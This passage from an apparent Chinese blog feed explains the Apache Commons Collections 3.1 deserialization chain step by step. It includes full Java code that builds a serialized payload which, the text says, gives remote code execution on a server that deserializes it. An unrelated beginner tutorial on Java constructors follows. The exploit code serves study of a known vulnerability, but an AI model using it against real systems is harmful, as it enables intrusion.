<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.java.accessibility.util.Translator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//传入Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="comment">//反射调用getMethod方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="comment">//反射调用invoke方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">                    <span class="comment">//反射调用exec方法</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        serialize(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> (Transformer) unserialize();</span><br><span class="line">        transformer.transform(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Transformer object)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">Ooutputs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test2.bin&quot;</span>));</span><br><span class="line">            Ooutputs.writeObject(object);</span><br><span class="line">            Ooutputs.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">OinputS</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test2.bin&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> OinputS.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422180243016.png" alt="image-20210422173805110"></p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422175356102.png" alt="image-20210422174219206"></p>
<p>通过初始化对象传入<code>Runtime.class</code>类作为参数，然后在<code>ChainedTransformer</code>类遍历数组调用<code>transform()</code>方法</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422170633875.png" alt="image-20210422175356102"></p>
<p>第二次循环，将第一次返回的Runtime作为参数，带入第二次<code>InvokerTransformer</code>类的transform函数参数中</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422181554850.png" alt="image-20210422180243016"></p>
<p>通过java的反射机制，容Runtime类找到<code>getRuntime()</code>方法，返回<code>Runtime.getRuntime()</code>方法，作为下次循环的参数。</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422173805110.png" alt="image-20210422180700526"></p>
<p>第三次循环环再次通过<code>InvokerTransformer</code>类的<code>transform</code>方法，通过反射调用<code>invoke</code>方法，真正的执行<code>getRuntime</code>函数并返回<code>Runtime</code>实例</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422180507556.png" alt="image-20210422180507556"></p>
<p>在第四次循环可以看到<code>object</code>参数变成了<code>Runtime</code>对象，并且通过反射调用<code>exec</code>函数来进行命令执行：</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422195736210.png" alt="image-20210422181024196"></p>
<p>最终执行命令</p>
<h5 id="寻找自动触发的transform"><a href="#寻找自动触发的transform" class="headerlink" title="寻找自动触发的transform"></a>寻找自动触发的transform</h5><p>在<code>test2.java</code>中有一个对对象进行<code>transform</code>函数的调用，反射虽然解决了<code>Runtime.getRuntime()</code>的参数传入问题，但是仍然需要调用<code>transform()</code>方法</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422195843683.png" alt="image-20210422181554850"></p>
<p>这样的条件在实际环境中仍然难以运用，所以需要寻找到一个仅仅调用<code>readObject()</code>方法就能够触发漏洞的方法。</p>
<p>即需要找到一个被重写的readObject函数，而且其中的流程可以触发transform函数</p>
<p>在<code>/org/apache/commons/collections/map/TransformedMap.java</code>中</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422163244156.png" alt="image-20210422195707050"><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422195707050.png" alt="image-20210422195736210"><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422181024196.png" alt="image-20210422195843683"></p>
<p>通过<code>TransformedMap</code>函数设置函数变量，通过调用<code>put()</code>函数，触发<code>transforValue()</code>函数的<code>valueTransformer.transform(object)</code>调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innermap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outmap</span> <span class="operator">=</span> TransformedMap.decorate(innermap, <span class="literal">null</span>, chain);</span><br><span class="line"></span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">onlyElement</span> <span class="operator">=</span> (Map.Entry) outmap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="寻找重写readObject"><a href="#寻找重写readObject" class="headerlink" title="寻找重写readObject()"></a>寻找重写readObject()</h5><p><code>AnnotationInvocationHandler</code>这个类成员变量memberValues是Map类型，并且<code>readObject()</code>函数中对于<code>memberValues.entrySet()</code>的每一项调用了<code>setValue()</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test4</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span></span><br><span class="line">                &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line">                &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="string">&quot;calc.exe&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innermap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outmap</span> <span class="operator">=</span> TransformedMap.decorate(innermap, <span class="literal">null</span>, chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Retention.class, outmap);</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;test4.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终生成的<code>test4.bin</code>传递给服务器使其反序列化就可以rce</p>
<h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><h6 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h6><p>下载<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1%E7%BB%84%E4%BB%B6">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1组件</a></p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422180700526.png" alt="image-20210422163210745"><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422163210745.png" alt="image-20210422163244156"></p>
<h6 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h6><p>POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvalObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChain</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">onlyElement</span> <span class="operator">=</span> (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422163043463.png" alt="image-20210422163043463"></p>
<h4 id="工具的使用–ysoserial"><a href="#工具的使用–ysoserial" class="headerlink" title="工具的使用–ysoserial"></a>工具的使用–<a href="https://github.com/frohoff/ysoserial">ysoserial</a></h4>]]></content>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 构造函数</title>
    <url>/2024/05/21/Java-%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/Java-%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h4 id="创建java构造函数的规则"><a href="#创建java构造函数的规则" class="headerlink" title="创建java构造函数的规则"></a>创建java构造函数的规则</h4><ul>
<li>构造函数名称必须和类名称相同</li>
<li>构造函数必须没有显式返回类型<span id="more"></span></li>
</ul>
<h4 id="java-构造函数的类型"><a href="#java-构造函数的类型" class="headerlink" title="java 构造函数的类型"></a>java 构造函数的类型</h4><ul>
<li>默认构造函数(无参数)<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">t1</span>&#123;</span><br><span class="line">    t1()&#123;</span><br><span class="line">        System.out.print(<span class="number">123</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cst1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">t1</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">t1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
输出结果为：<br>  <img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210302224101161.png" alt="image-20210302222409753">默认构造函数的目的是：根据类型为对象提供默认值，比如：0，null……<br> 显示默认值的默认构造函数：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">people</span>&#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(id+<span class="string">&quot; &quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cst2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">people</span> <span class="variable">man</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">people</span>();</span><br><span class="line">        <span class="type">people</span> <span class="variable">woman</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">people</span>();</span><br><span class="line"></span><br><span class="line">        man.display();</span><br><span class="line">        woman.display();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
运行的结果为：<br><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210302223010265.png" alt="image-20210302223010265"><br>在上面的people类之中，代码没有创建任何构造函数，但是编译器<strong>自动</strong>地提供了一个<strong>默认构造函数</strong>。默认构造函数分别为字段：<code>id</code>和<code>name</code>分别提供了<code>0</code>和<code>null值</code></li>
</ul>
<ul>
<li><p>参数化构造函数：参数化构造函数用于为不同对象提供不同初始化的值</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>&#123;</span><br><span class="line">    <span class="type">int</span> Student_id;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    Student(<span class="type">int</span> i, String Student_name)&#123;</span><br><span class="line">        Student_id = i;</span><br><span class="line">        name = Student_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(Student_id+<span class="string">&quot; : &quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cst3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">1</span>, <span class="string">&quot;John&quot;</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">2</span>, <span class="string">&quot;Roy&quot;</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">3</span>, <span class="string">&quot;Karry&quot;</span>);</span><br><span class="line"></span><br><span class="line">        s1.display();</span><br><span class="line">        s2.display();</span><br><span class="line">        s3.display();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  输出结果为：</p>
<p>  <img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210302225709547.png" alt="image-20210302224101161"></p>
</li>
</ul>
<h3 id="Java构造函数重载"><a href="#Java构造函数重载" class="headerlink" title="Java构造函数重载"></a>Java构造函数重载</h3><p>构造方法重载是Java一种技术，一个类可以有任何数量的参数列表不同的构造函数。编译器会通过<code>构造函数参数列表</code>中的<code>参数数量</code>及其<code>类型</code>来区分这些构造函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">classes</span>&#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> height;</span><br><span class="line">    <span class="type">int</span> weight;</span><br><span class="line"></span><br><span class="line">    classes(<span class="type">int</span> i, String n)&#123;</span><br><span class="line">        id = i;</span><br><span class="line">        name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    classes(<span class="type">int</span> i, String n, <span class="type">int</span> h, <span class="type">int</span> w)&#123;</span><br><span class="line">        id = i;</span><br><span class="line">        name = n;</span><br><span class="line">        height = h;</span><br><span class="line">        weight = w;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(id+<span class="string">&quot; : &quot;</span>+name+<span class="string">&quot;, &quot;</span>+height+<span class="string">&quot;, &quot;</span>+weight);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cst4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">classes</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">classes</span>(<span class="number">1</span>, <span class="string">&quot;karry&quot;</span>);</span><br><span class="line">        <span class="type">classes</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">classes</span>(<span class="number">2</span>, <span class="string">&quot;roy&quot;</span>, <span class="number">180</span>, <span class="number">110</span>);</span><br><span class="line"></span><br><span class="line">        s1.display();</span><br><span class="line">        s2.display();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为：</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210302222409753.png" alt="image-20210302225709547"></p>
<h4 id="Java-的构造函数的特点"><a href="#Java-的构造函数的特点" class="headerlink" title="Java 的构造函数的特点"></a>Java 的构造函数的特点</h4><ul>
<li>构造器用于初始化对象的状态(数据)</li>
<li>构造函数不能有返回类型</li>
<li>构造函数隐式调用</li>
<li>如果没有指定任何构造函数，java编译器提供一个默认构造函数</li>
<li>构造函数的名称必须和类名称相同</li>
</ul>
<h3 id="Java拷贝构造函数"><a href="#Java拷贝构造函数" class="headerlink" title="Java拷贝构造函数"></a>Java拷贝构造函数</h3><p>在Java中将一个对象的值赋值到另一个对象中的方法</p>
<ul>
<li>构造函数</li>
<li>将一个对象的值分配给另一个函数</li>
<li>Object类的<code>clone()方法</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stu</span>&#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    Stu(<span class="type">int</span> i, String n)&#123;</span><br><span class="line">        id = i;</span><br><span class="line">        name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Stu(Stu s)&#123;</span><br><span class="line">        id = s.id;</span><br><span class="line">        name = s.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dispaly</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(id + <span class="string">&quot; : &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cst5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Stu</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>(<span class="number">1</span>, <span class="string">&quot;kry&quot;</span>);</span><br><span class="line"></span><br><span class="line">        s1.dispaly();</span><br><span class="line">    